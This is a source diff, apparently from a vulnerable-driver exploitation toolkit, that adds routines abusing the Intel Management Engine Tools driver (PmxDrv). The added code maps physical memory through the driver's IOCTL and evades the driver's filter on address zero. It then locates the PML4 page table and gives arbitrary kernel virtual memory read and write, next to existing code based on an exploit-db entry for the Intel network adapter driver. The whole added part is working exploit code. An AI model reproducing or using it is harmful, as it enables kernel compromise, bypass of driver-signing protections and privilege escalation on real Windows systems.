@@ -1,14 +1,17 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020 - 2023
+*  (C) COPYRIGHT AUTHORS, 2020 - 2024
 *
-*  TITLE:       NAL.CPP
+*  TITLE:       INTEL.CPP
 *
-*  VERSION:     1.31
+*  VERSION:     1.42
 *
-*  DATE:        14 Apr 2023
+*  DATE:        01 Apr 2024
 *
-*  Intel Network Adapter iQVM64 driver routines.
+*  Intel drivers routines.
+*
+*    Network Adapter iQVM64 driver aka Nal
+*    Intel(R) Management Engine Tools Driver aka PmxDrv
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -18,7 +21,7 @@
 *******************************************************************************/
 
 #include "global.h"
-#include "idrv/nal.h"
+#include "idrv/intel.h"
 
 //
 // Based on https://www.exploit-db.com/exploits/36392
@@ -354,5 +357,325 @@ BOOL WINAPI NalReadVirtualMemoryEx(
     }
 
     SetLastError(dwError);
+    return bResult;
+}
+
+/*
+* 
+* Intel ME driver
+* 
+*/
+
+/*
+* PmxDrvMapMemory
+*
+* Purpose:
+*
+* Map physical memory through \Device\PhysicalMemory.
+*
+*/
+PVOID PmxDrvMapMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR PhysicalAddress,
+    _In_ ULONG NumberOfBytes)
+{
+    BOOL bHack = FALSE;
+    PVOID pvMappedMemory = NULL;
+    PMX_INPUT_BUFFER request;
+    PMX_MAPMEM_PACKET packet;
+
+    request.InputSize = sizeof(request) + sizeof(PMX_MAPMEM_PACKET);
+    request.Padding = 0;
+
+    packet.Size = sizeof(PMX_MAPMEM_PACKET);
+    packet.CommitSize = NumberOfBytes;
+    if (PhysicalAddress == 0) { //intel seems filters this
+        bHack = TRUE;
+        PhysicalAddress = 0x1;
+    }
+
+    packet.SectionOffset.QuadPart = PhysicalAddress;
+
+    request.Data = &packet;
+
+    if (supCallDriver(DeviceHandle,
+        IOCTL_PMXDRV_MAP_MEMORY,
+        &request,
+        sizeof(request),
+        NULL,
+        0))
+    {
+        if (bHack) {
+            packet.SectionOffset.QuadPart &= 0xfff;
+            packet.Result -= packet.SectionOffset.QuadPart;
+        }
+        pvMappedMemory = (PVOID)packet.Result;
+    }
+
+    return pvMappedMemory;
+}
+
+/*
+* PmxDrvUnmapMemory
+*
+* Purpose:
+*
+* Unmap previously mapped physical memory.
+*
+*/
+VOID PmxDrvUnmapMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ PVOID SectionToUnmap
+)
+{
+    PMX_INPUT_BUFFER request;
+    PMX_UNMAPMEM_PACKET packet;
+
+    request.InputSize = sizeof(request) + sizeof(PMX_UNMAPMEM_PACKET);
+    request.Padding = 0;
+
+    RtlSecureZeroMemory(&packet, sizeof(packet));
+
+    packet.Address = SectionToUnmap;
+    packet.Size = sizeof(PMX_UNMAPMEM_PACKET);
+
+    request.Data = &packet;
+
+    supCallDriver(DeviceHandle,
+        IOCTL_PMXDRV_UNMAP_MEMORY,
+        &request,
+        sizeof(request),
+        NULL,
+        0);
+}
+
+/*
+* PmxDrvReadWritePhysicalMemory
+*
+* Purpose:
+*
+* Read/Write physical memory.
+*
+*/
+BOOL WINAPI PmxDrvReadWritePhysicalMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR PhysicalAddress,
+    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
+    _In_ ULONG NumberOfBytes,
+    _In_ BOOLEAN DoWrite)
+{
+    BOOL bResult = FALSE;
+    DWORD dwError = ERROR_SUCCESS;
+    PVOID mappedSection = NULL;
+
+    //
+    // Map physical memory section.
+    //
+    mappedSection = PmxDrvMapMemory(DeviceHandle,
+        PhysicalAddress,
+        NumberOfBytes);
+
+    if (mappedSection) {
+
+        __try {
+
+            if (DoWrite) {
+                RtlCopyMemory(mappedSection, Buffer, NumberOfBytes);
+            }
+            else {
+                RtlCopyMemory(Buffer, mappedSection, NumberOfBytes);
+            }
+
+            bResult = TRUE;
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            bResult = FALSE;
+            dwError = GetExceptionCode();
+        }
+
+        //
+        // Unmap physical memory section.
+        //
+        PmxDrvUnmapMemory(DeviceHandle,
+            mappedSection);
+
+    }
+    else {
+        dwError = GetLastError();
+    }
+
+    SetLastError(dwError);
+    return bResult;
+}
+
+/*
+* PmxDrvReadPhysicalMemory
+*
+* Purpose:
+*
+* Read from physical memory.
+*
+*/
+BOOL WINAPI PmxDrvReadPhysicalMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR PhysicalAddress,
+    _In_ PVOID Buffer,
+    _In_ ULONG NumberOfBytes)
+{
+    return PmxDrvReadWritePhysicalMemory(DeviceHandle,
+        PhysicalAddress,
+        Buffer,
+        NumberOfBytes,
+        FALSE);
+}
+
+/*
+* PmxDrvWritePhysicalMemory
+*
+* Purpose:
+*
+* Write to physical memory.
+*
+*/
+BOOL WINAPI PmxDrvWritePhysicalMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR PhysicalAddress,
+    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
+    _In_ ULONG NumberOfBytes)
+{
+    return PmxDrvReadWritePhysicalMemory(DeviceHandle,
+        PhysicalAddress,
+        Buffer,
+        NumberOfBytes,
+        TRUE);
+}
+
+/*
+* PmxDrvQueryPML4Value
+*
+* Purpose:
+*
+* Locate PML4.
+*
+*/
+BOOL WINAPI PmxDrvQueryPML4Value(
+    _In_ HANDLE DeviceHandle,
+    _Out_ ULONG_PTR* Value)
+{
+    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;
+
+    ULONG cbRead = 0x100000;
+
+    *Value = 0;
+
+    SetLastError(ERROR_SUCCESS);
+
+    pbLowStub1M = (ULONG_PTR)PmxDrvMapMemory(DeviceHandle,
+        0ULL,
+        cbRead);
+
+    if (pbLowStub1M) {
+
+        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
+        if (PML4)
+            *Value = PML4;
+
+        PmxDrvUnmapMemory(DeviceHandle,
+            (PVOID)pbLowStub1M);
+
+    }
+
+    return (PML4 != 0);
+}
+
+/*
+* PmxDrvVirtualToPhysical
+*
+* Purpose:
+*
+* Translate virtual address to the physical.
+*
+*/
+BOOL WINAPI PmxDrvVirtualToPhysical(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR VirtualAddress,
+    _Out_ ULONG_PTR* PhysicalAddress)
+{
+    return PwVirtualToPhysical(DeviceHandle,
+        PmxDrvQueryPML4Value,
+        PmxDrvReadPhysicalMemory,
+        VirtualAddress,
+        PhysicalAddress);
+}
+
+/*
+* PmxDrvReadKernelVirtualMemory
+*
+* Purpose:
+*
+* Read virtual memory.
+*
+*/
+BOOL WINAPI PmxDrvReadKernelVirtualMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR Address,
+    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
+    _In_ ULONG NumberOfBytes)
+{
+    BOOL bResult;
+    ULONG_PTR physicalAddress = 0;
+
+    SetLastError(ERROR_SUCCESS);
+
+    bResult = PmxDrvVirtualToPhysical(DeviceHandle,
+        Address,
+        &physicalAddress);
+
+    if (bResult) {
+
+        bResult = PmxDrvReadWritePhysicalMemory(DeviceHandle,
+            physicalAddress,
+            Buffer,
+            NumberOfBytes,
+            FALSE);
+
+    }
+
+    return bResult;
+}
+
+/*
+* PmxDrvWriteKernelVirtualMemory
+*
+* Purpose:
+*
+* Write virtual memory.
+*
+*/
+BOOL WINAPI PmxDrvWriteKernelVirtualMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR Address,
+    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
+    _In_ ULONG NumberOfBytes)
+{
+    BOOL bResult;
+    ULONG_PTR physicalAddress = 0;
+
+    SetLastError(ERROR_SUCCESS);
+
+    bResult = PmxDrvVirtualToPhysical(DeviceHandle,
+        Address,
+        &physicalAddress);
+
+    if (bResult) {
+
+        bResult = PmxDrvReadWritePhysicalMemory(DeviceHandle,
+            physicalAddress,
+            Buffer,
+            NumberOfBytes,
+            TRUE);
+
+    }
+
     return bResult;
 }
